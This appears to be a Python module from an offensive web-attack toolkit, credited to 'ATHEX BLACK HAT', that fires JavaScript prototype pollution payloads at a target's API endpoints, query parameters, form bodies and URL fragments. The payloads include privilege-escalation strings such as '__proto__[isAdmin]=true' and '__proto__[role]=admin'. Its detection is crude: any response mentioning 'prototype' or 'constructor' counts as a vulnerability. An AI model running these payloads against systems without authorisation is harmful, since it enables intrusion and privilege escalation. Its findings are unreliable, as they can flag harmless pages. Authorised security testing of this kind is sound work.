# modules/attacks/prototype_pollution.py

"""
Prototype Pollution Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Tests for JavaScript prototype pollution vulnerabilities
in Node.js and client-side applications.
"""

import json
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field

import requests
from requests.exceptions import RequestException


@dataclass
class PrototypePollutionResult:
    """Represents a prototype pollution test result."""
    url: str
    parameter: str
    payload: str
    pollution_type: str
    status_code: int
    response_reflection: bool
    vulnerability_found: bool
    description: str
    evidence: Dict[str, Any]


class PrototypePollution:
    """
    Prototype pollution attack engine.
    
    Tests for JavaScript prototype pollution vulnerabilities
    in Node.js applications and client-side code.
    """
    
    PROTO_PAYLOADS = {
        'constructor_prototype': [
            '__proto__[test]=polluted',
            '__proto__.test=polluted',
            'constructor[prototype][test]=polluted',
        ],
        'json_parse': [
            '{"__proto__":{"test":"polluted"}}',
            '{"constructor":{"prototype":{"test":"polluted"}}}',
        ],
        'object_assign': [
            '__proto__[isAdmin]=true',
            '__proto__[role]=admin',
            'constructor[prototype][isAdmin]=true',
        ],
        'url_parameters': [
            '__proto__[test]=polluted',
            '__proto__.test=polluted',
            'constructor.prototype.test=polluted',
        ],
    }
    
    DETECTION_INDICATORS = [
        'polluted',
        '__proto__',
        'prototype',
        'constructor',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the prototype pollution tester.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.results: List[PrototypePollutionResult] = []
        self.errors: List[str] = []
    
    def test_json_pollution(
        self,
        url: str,
        payload: str
    ) -> PrototypePollutionResult:
        """
        Test for prototype pollution via JSON input.
        
        Args:
            url: Target URL
            payload: Pollution payload
            
        Returns:
            PrototypePollutionResult object
        """
        try:
            headers = {'Content-Type': 'application/json'}
            
            response = self.session.post(
                url,
                data=payload,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            response_text = response.text.lower()
            
            pollution_indicators = any(
                indicator.lower() in response_text
                for indicator in self.DETECTION_INDICATORS
            )
            
            error_based_indicators = any(
                keyword in response_text
                for keyword in ['__proto__', 'prototype', 'constructor']
            )
            
            vulnerability_found = pollution_indicators or error_based_indicators
            
            result = PrototypePollutionResult(
                url=url,
                parameter='json_body',
                payload=payload,
                pollution_type='json_parse',
                status_code=response.status_code,
                response_reflection=pollution_indicators,
                vulnerability_found=vulnerability_found,
                description=f'Prototype pollution via JSON: {payload[:100]}',
                evidence={
                    'status_code': response.status_code,
                    'reflection_detected': pollution_indicators,
                    'error_detected': error_based_indicators,
                }
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"JSON pollution test failed: {str(e)}")
            
            return PrototypePollutionResult(
                url=url,
                parameter='json_body',
                payload=payload,
                pollution_type='json_parse',
                status_code=0,
                response_reflection=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence={}
            )
    
    def test_parameter_pollution(
        self,
        url: str,
        parameter: str,
        payload: str
    ) -> PrototypePollutionResult:
        """
        Test for prototype pollution via URL parameters.
        
        Args:
            url: Target URL
            parameter: Target parameter
            payload: Pollution payload
            
        Returns:
            PrototypePollutionResult object
        """
        try:
            params = {parameter: payload}
            
            response = self.session.get(
                url,
                params=params,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            response_text = response.text.lower()
            
            pollution_detected = any(
                indicator.lower() in response_text
                for indicator in self.DETECTION_INDICATORS
            )
            
            vulnerability_found = pollution_detected
            
            result = PrototypePollutionResult(
                url=url,
                parameter=parameter,
                payload=payload,
                pollution_type='url_parameters',
                status_code=response.status_code,
                response_reflection=pollution_detected,
                vulnerability_found=vulnerability_found,
                description=f'Prototype pollution via {parameter}: {payload}',
                evidence={
                    'status_code': response.status_code,
                    'reflection_detected': pollution_detected,
                }
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"Parameter pollution test failed: {str(e)}")
            
            return PrototypePollutionResult(
                url=url,
                parameter=parameter,
                payload=payload,
                pollution_type='url_parameters',
                status_code=0,
                response_reflection=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence={}
            )
    
    def test_form_pollution(
        self,
        url: str,
        payload: str
    ) -> PrototypePollutionResult:
        """
        Test for prototype pollution via form data.
        
        Args:
            url: Target URL
            payload: Pollution payload
            
        Returns:
            PrototypePollutionResult object
        """
        try:
            data = {
                '__proto__[test]': 'polluted',
                'name': 'test',
                'email': 'test@test.com',
            }
            
            response = self.session.post(
                url,
                data=data,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            response_text = response.text.lower()
            
            pollution_detected = any(
                indicator.lower() in response_text
                for indicator in self.DETECTION_INDICATORS
            )
            
            vulnerability_found = pollution_detected
            
            result = PrototypePollutionResult(
                url=url,
                parameter='form_body',
                payload=str(data),
                pollution_type='form_data',
                status_code=response.status_code,
                response_reflection=pollution_detected,
                vulnerability_found=vulnerability_found,
                description=f'Prototype pollution via form data',
                evidence={
                    'status_code': response.status_code,
                    'reflection_detected': pollution_detected,
                }
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"Form pollution test failed: {str(e)}")
            
            return PrototypePollutionResult(
                url=url,
                parameter='form_body',
                payload=str({}),
                pollution_type='form_data',
                status_code=0,
                response_reflection=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence={}
            )
    
    def test_client_side_vectors(self, url: str) -> List[PrototypePollutionResult]:
        """
        Test for client-side prototype pollution vectors.
        
        Args:
            url: Target URL
            
        Returns:
            List of PrototypePollutionResult objects
        """
        results = []
        
        client_side_payloads = [
            '?__proto__[test]=polluted',
            '#__proto__[test]=polluted',
            '?constructor[prototype][test]=polluted',
            '#constructor[prototype][test]=polluted',
        ]
        
        for payload in client_side_payloads:
            try:
                test_url = f"{url}{payload}"
                
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                script_patterns = [
                    r'\.__proto__',
                    r'\.prototype',
                    r'\.constructor\[',
                ]
                
                import re
                script_found = any(
                    re.search(pattern, response.text, re.IGNORECASE)
                    for pattern in script_patterns
                )
                
                result = PrototypePollutionResult(
                    url=url,
                    parameter='client_side',
                    payload=payload,
                    pollution_type='client_side',
                    status_code=response.status_code,
                    response_reflection=script_found,
                    vulnerability_found=script_found,
                    description=f'Client-side prototype pollution vector: {payload}',
                    evidence={
                        'status_code': response.status_code,
                        'script_found': script_found,
                    }
                )
                
                results.append(result)
                
            except RequestException:
                continue
        
        self.results.extend(results)
        return results
    
    def run(self) -> Dict[str, Any]:
        """
        Run all prototype pollution tests.
        
        Returns:
            Dictionary with test results
        """
        api_endpoints = [
            f"{self.target}/api/users",
            f"{self.target}/api/data",
            f"{self.target}/api/settings",
        ]
        
        for endpoint in api_endpoints:
            for payload in self.PROTO_PAYLOADS['json_parse']:
                self.test_json_pollution(endpoint, payload)
            
            self.test_form_pollution(endpoint, str(self.PROTO_PAYLOADS['object_assign'][0]))
        
        common_params = ['data', 'input', 'value', 'query', 'search', 'filter']
        for param in common_params:
            for payload in self.PROTO_PAYLOADS['url_parameters'][:2]:
                self.test_parameter_pollution(f"{self.target}/api/search", param, payload)
        
        self.test_client_side_vectors(self.target)
        
        findings = []
        for result in self.results:
            if result.vulnerability_found:
                findings.append({
                    'type': f'Prototype Pollution: {result.pollution_type}',
                    'severity': 'high',
                    'endpoint': result.url,
                    'parameter': result.parameter,
                    'payload': result.payload,
                    'description': result.description,
                    'evidence': result.evidence,
                    'remediation': 'Use Object.create(null) for objects. '
                                   'Freeze Object.prototype. '
                                   'Validate and sanitize all user input. '
                                   'Use map/set instead of plain objects for user data.',
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'pollution_types_tested': len(self.PROTO_PAYLOADS),
            'total_tests': len(self.results),
            'vulnerabilities_found': len(findings),
        }